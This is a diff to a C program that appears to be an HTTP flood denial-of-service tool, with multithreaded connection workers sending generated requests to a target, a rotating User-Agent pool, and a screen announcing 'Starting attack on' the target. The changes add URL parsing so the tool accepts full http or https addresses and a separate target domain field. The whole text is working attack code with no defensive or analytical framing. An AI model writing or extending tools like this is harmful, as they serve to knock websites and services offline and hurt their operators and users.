@@ -35,7 +35,7 @@ UNAUTHORIZED USE STRICTLY PROHIBITED
 #include <pthread.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <netinet/tcp.h>  // Added for TCP_NODELAY
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <time.h>
@@ -45,6 +45,7 @@ UNAUTHORIZED USE STRICTLY PROHIBITED
 #include <sys/time.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
+#include <stdbool.h>
 
 // Configuration
 #define MAX_THREADS 1024
@@ -67,10 +68,11 @@ atomic_int running = 1;
 typedef struct {
     char target_ip[INET6_ADDRSTRLEN];
     char target_host[256];
+    char target_domain[256];
     int target_port;
     int thread_count;
     int duration;
-    int use_ssl;
+    bool use_ssl;
 } config_t;
 
 // Enhanced User-Agent pool
@@ -335,7 +337,7 @@ void *connection_pool_worker(void *arg) {
         }
 
         // Generate and send request
-        generate_request(request_buffer, config->target_host, sizeof(request_buffer));
+        generate_request(request_buffer, config->target_domain, sizeof(request_buffer));
         ssize_t bytes = send(sockfd, request_buffer, strlen(request_buffer), MSG_NOSIGNAL);
         
         if (bytes <= 0) {
@@ -376,7 +378,7 @@ void *stats_thread(void *arg) {
     
     printf("\033[2J\033[H"); // Clear screen
     printf("\033[1;32m[+] Starting attack on %s (%s:%d) with %d threads\033[0m\n", 
-           config->target_host, config->target_ip, config->target_port, config->thread_count);
+           config->target_domain, config->target_ip, config->target_port, config->thread_count);
     printf("\033[1;33m[+] Press Ctrl+C to stop\n\033[0m");
     
     while (atomic_load(&running)) {
@@ -423,10 +425,47 @@ void *stats_thread(void *arg) {
     return NULL;
 }
 
+void parse_url(const char *url, char *domain, int *port, bool *use_ssl) {
+    char *ptr;
+    *use_ssl = false;
+    *port = 80;
+    
+    // Check for https
+    if (strstr(url, "https://") == url) {
+        *use_ssl = true;
+        *port = 443;
+        ptr = (char *)url + 8;
+    } else if (strstr(url, "http://") == url) {
+        ptr = (char *)url + 7;
+    } else {
+        ptr = (char *)url;
+    }
+    
+    // Find domain end
+    char *domain_end = strchr(ptr, '/');
+    if (domain_end == NULL) {
+        domain_end = strchr(ptr, ':');
+    }
+    
+    if (domain_end == NULL) {
+        strncpy(domain, ptr, 255);
+    } else {
+        strncpy(domain, ptr, domain_end - ptr);
+        domain[domain_end - ptr] = '\0';
+    }
+    
+    // Check for port
+    char *port_ptr = strchr(ptr, ':');
+    if (port_ptr != NULL && port_ptr < (domain_end ? domain_end : ptr + strlen(ptr))) {
+        *port = atoi(port_ptr + 1);
+    }
+}
+
 int main(int argc, char *argv[]) {
     if (argc < 3) {
         printf("Usage: %s <target_url_or_ip> <threads> [port] [duration]\n", argv[0]);
         printf("Example: %s example.com 100 80 60\n", argv[0]);
+        printf("Example: %s https://example.com 100 443 60\n", argv[0]);
         return 1;
     }
 
@@ -435,10 +474,19 @@ int main(int argc, char *argv[]) {
     memset(&config, 0, sizeof(config));
     
     // Parse arguments
-    strncpy(config.target_host, argv[1], sizeof(config.target_host) - 1);
     config.thread_count = atoi(argv[2]);
-    config.target_port = (argc > 3) ? atoi(argv[3]) : 80;
     config.duration = (argc > 4) ? atoi(argv[4]) : 0;
+    
+    // Parse URL or IP
+    parse_url(argv[1], config.target_domain, &config.target_port, &config.use_ssl);
+    
+    // Override port if explicitly provided
+    if (argc > 3) {
+        config.target_port = atoi(argv[3]);
+    }
+    
+    // Copy host
+    strncpy(config.target_host, config.target_domain, sizeof(config.target_host) - 1);
     
     if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
         printf("[-] Invalid thread count (1-%d)\n", MAX_THREADS);
@@ -446,19 +494,22 @@ int main(int argc, char *argv[]) {
     }
 
     // Resolve target
-    if (inet_pton(AF_INET, config.target_host, &(struct in_addr){0}) != 1) {
-        if (resolve_target(config.target_host, config.target_ip) != 0) {
+    if (inet_pton(AF_INET, config.target_domain, &(struct in_addr){0}) != 1) {
+        if (resolve_target(config.target_domain, config.target_ip) != 0) {
             printf("[-] Failed to resolve target\n");
             return 1;
         }
     } else {
-        strcpy(config.target_ip, config.target_host);
+        strcpy(config.target_ip, config.target_domain);
     }
 
-    printf("[+] Target: %s (%s:%d)\n", config.target_host, config.target_ip, config.target_port);
+    printf("[+] Target: %s (%s:%d)\n", config.target_domain, config.target_ip, config.target_port);
     printf("[+] Threads: %d\n", config.thread_count);
     if (config.duration > 0) {
         printf("[+] Duration: %d seconds\n", config.duration);
+    }
+    if (config.use_ssl) {
+        printf("[-] SSL/TLS is not supported in this version. Will attempt plain HTTP on port %d\n", config.target_port);
     }
 
     // Initialize random seed
